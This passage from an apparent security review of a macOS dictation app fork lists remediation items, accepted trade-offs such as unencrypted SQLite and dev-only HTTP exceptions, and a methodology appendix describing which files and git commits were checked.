7. **Default `shouldSaveAudioRecordings` and `shouldSaveDictationHistory` to `false`.** Make persistence opt-in. For existing users, leave the setting where it is. New installs default to off.
8. **Add "Auto-delete dictations older than N days" Setting** with default 30 (or 7). One delete-by-date method on `DictationRepository`, one timer in app delegate.
9. **Documented threat model in `docs/security.md`** (this document).
10. **Per-provider retention tooltip in LLM Settings UI** — surface what each provider does with the data.

### Document as known trade-off (don't fix, acknowledge)

11. **Plain SQLite with no SQLCipher.** The cost (perf, complexity, SQLCipher adds binary weight + ongoing GRDB-fork maintenance) outweighs the marginal benefit over FileVault for a personal-tool threat model. Document FileVault as a hard prerequisite. Revisit if shipping to enterprise/HIPAA users.
12. **No memory zeroing of transcript strings.** Swift `String` makes this painful and the threat model doesn't justify it.
13. **HTTP-over-Tailscale allowed in dev builds.** Tailscale's WireGuard layer makes this a deliberate choice. Production builds do NOT have these ATS exceptions, so released binaries are stricter.
14. **DNS rebinding not validated against in URL allow-list.** Accepted; mitigation cost is high (post-resolution IP check).
15. **BCBSMA acronym JSON + coworker names in git history (commits `0faae59`, `b17d143`, `8986427`).** Treat as already-public. Force-push history rewrite is destructive and not worth it; the fork being private is the current safety.
16. **Sparkle EdDSA signing key (`SUPublicEDKey`) lives in `build_app_bundle.sh`.** Public key — by design exposed. Private key is in upstream maintainer's keychain only. No rotation policy documented. Since this fork won't ship through the upstream appcast, the fork doesn't need to worry about this until/unless it ships its own builds via Sparkle.

---

## Appendix: Methodology

**Tools used:** `git log -S` (pickaxe) for history scanning; `grep` over `Sources/`, `scripts/`, `docs/`; direct `Read` of every relevant Swift file; GitHub Releases API for dep versioning; NVD/GitHub Advisories for CVE lookup.

**Files read in full or substantially:**

- `Package.swift`, `Package.resolved`
- `Sources/MacParakeetCore/Services/{DictationService,LLMClient,LLMConfigStore,AppPaths,ClipboardService,TelemetryService,FeedbackService,AutoSaveService,LocalCLIExecutor,CrashReporter}.swift`
- `Sources/MacParakeetCore/Database/DatabaseManager.swift`
- `Sources/MacParakeetCore/Licensing/KeychainKeyValueStore.swift`
- `Sources/MacParakeetCore/AppRuntimePreferences.swift`
- `Sources/MacParakeetCore/Services/TelemetryEvent.swift`
- `Sources/MacParakeetViewModels/LLMSettingsDraft.swift`
- `scripts/{dev/run_app.sh,dist/build_app_bundle.sh,dist/sign_notarize.sh}`
- `docs/telemetry.md`

**Verification of scope claims:**

- "Dev build allows HTTP to ts.net, release does not" — verified by reading both Info.plist heredocs.
- "Save-everything by default" — verified by reading `AppRuntimePreferences.shouldSaveAudioRecordings` and `shouldSaveDictationHistory`.
- "BCBSMA acronyms in git history" — verified via `git show 0faae59:scripts/vocabulary/bcbsma_acronyms.json`.
- "Yeswanth/Susanta in git history" — verified via `git show 8986427:Sources/MacParakeetCore/Models/AppProfile.swift`.
- "API keys in Keychain not UserDefaults" — verified via `LLMConfigStore.swift` and `KeychainKeyValueStore.swift`.
- "No retention-opt-out headers" — `grep -rn "anthropic-beta|skip-retention|disable_training|store: false|store=false|usage_logging" Sources/` returned zero hits.
- "iCloud-isolated runtime data" — verified that `AppPaths.appSupportDir` resolves to `~/Library/Application Support/MacParakeet`, which Apple excludes from CloudKit.

**Out of scope of this review:** model file integrity (Parakeet CoreML bundle hashes), the Cloudflare telemetry endpoint security (server-side), the macparakeet.com website, the upstream `moona3k/macparakeet` repo, and any third-party Mac app the user runs alongside MacParakeet (Maccy, Raycast, etc.).
